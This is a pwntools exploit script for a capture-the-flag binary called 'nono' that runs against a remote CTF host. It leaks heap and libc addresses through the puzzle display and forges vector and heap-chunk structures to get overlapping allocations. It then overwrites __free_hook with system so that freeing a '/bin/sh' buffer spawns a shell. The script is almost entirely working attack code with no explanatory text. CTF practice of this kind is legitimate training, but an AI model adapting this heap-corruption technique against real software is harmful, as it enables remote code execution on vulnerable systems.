from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './nono'
HOST = 'pwn03.chal.ctf.westerns.tokyo'
PORT = 22915

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a():
    r.sendlineafter('A', 'A')

r = start()

def solve_cross():
    r.sendlineafter('input: ', '1')
    r.sendlineafter('Index:\n', '0')
    r.sendlineafter(': ', '0 0 0 2 1 1 2 0 2 2')
def solve_heart():
    r.sendlineafter('input: ', '1')
    r.sendlineafter('Index:\n', '1')
    r.sendlineafter(': ', '0 0 0 1 0 2 1 0 1 1 1 2 1 3 2 1 2 2 2 3 2 4 3 0 3 1 3 2 3 3 4 0 4 1 4 2')

def add(title, size, data):
    r.sendlineafter('input: ', '2')
    r.sendlineafter('Title: ', title)
    r.sendlineafter('Size: ', str(size))
    r.sendafter('Puzzle: ', data)

def play(idx, answer='a'):
    r.sendlineafter('input: ', '1')
    r.sendlineafter('Index:\n', str(idx))
    ret = r.recvuntil('Status')
    r.sendlineafter(': ', answer)
    return ret 

def delete(idx):
    r.sendlineafter('input: ', '3')
    r.sendlineafter('Index:\n', str(idx))

def show(idx):
    r.sendlineafter('input: ', '4')
    ret = r.recvuntil('Index:\n')
    r.sendline(str(idx))
    return ret

# solve_cross()
# solve_heart()

add('A', 91, '\x00'*(0x400))
leak = play(2).split('Column\'s')[0].split('Row\'s Numbers')[1].split('\n')[3:]
heap_leak = 0
for i in range(12*4):
    heap_leak += (int(leak[i], 2) << i)
dbg('heap_leak')

heap = heap_leak - 0x11f90
target = heap + 0x11ff0
heart = heap + 0x11f30
payload = ''
payload += flat(0x5b, target, target, 8, 0xdeadbeef, 0x21, heap + 0x11fb0, heap + 0x12480, 0, 0x21)

add('B', 56, payload)

fake_vec = heap + 0x124b0
add('C', 92, '\x00'*0x400+flat(fake_vec, fake_vec+0x10, fake_vec+0x10))

delete(0)
leak = u64(show(0).split('0 : ')[1].split(' (')[0])
dbg('leak')
base = leak - 0x1ebbe0
dbg('base')
system = base + 0x55410
fh = base + 0x1eeb28


fake_vec2 = heap + 0x12000
'''
+0x12000 0x12030 0x12060
+0x12010 0x12090 0
+0x12020 0       0x41
+0x12030 1       0x12120
+0x12040 0x120c0 8
+0x12050 0       0x41
+0x12060 1       0x12140
+0x12070 0x120e0 8
+0x12080 0       0x41
+0x12090 0       0x12160
+0x120a0 0x12100 8
+0x120b0 0       0x21
+0x120c0 overlap 0
+0x120d0 0       0x21
+0x120e0 victim  0
+0x120f0 0       0x21
+0x12100 watcher 0
+0x12110 0       0x101
+0x12120 0       0x0
+0x12130 0       0xe1
+0x12140 0       0x0
+0x12150 0       0xe1

'''
payload = ''
payload += flat(0x11111111, 0x31, heap+0x12030, heap + 0x12030, heap + 0x12060, heap+0x12090)
payload += flat(0, 0x41, 1, heap+0x12120, heap+0x120c0, 8)
payload += flat(0, 0x41, 1, heap+0x12140, heap+0x120e0, 8)
payload += flat(0, 0x41, 1, heap+0x12160, heap+0x12100, 8)
payload += flat(0, 0x21) + 'overlap\x00' + p64(0)
payload += flat(0, 0x21) + 'victim\x00\x00' + p64(0)
payload += flat(0, 0x21) + 'watcher\x00' + p64(0)
payload += flat(0, 0x101, 0, 0, 0, 0xe1, 0, 0, 0, 0xe1)
add('D', 56, payload)

add('E', 92, '\x00'*0x400+flat(fake_vec2, fake_vec2+0x20, fake_vec2+0x20))
delete(3)
delete(2)
delete(1)
add('F', 44, flat(0, 0, 0, 0xe1, fh))
add('G', 40, flat(0, 0) + 'sh'+'\x00'*6 + p64(heap+0x12050)*2+p64(8)+p64(0)*12+'/bin/sh\x00'+p64(heap+0x12030)+p64(heap+0x12150))
add('H', 40, p64(system))

if args.D:
    debug(r, [])

# force vector to migrate buffer
for i in range(4):
    add('hoge', 1, 'a')

r.interactive()
r.close()
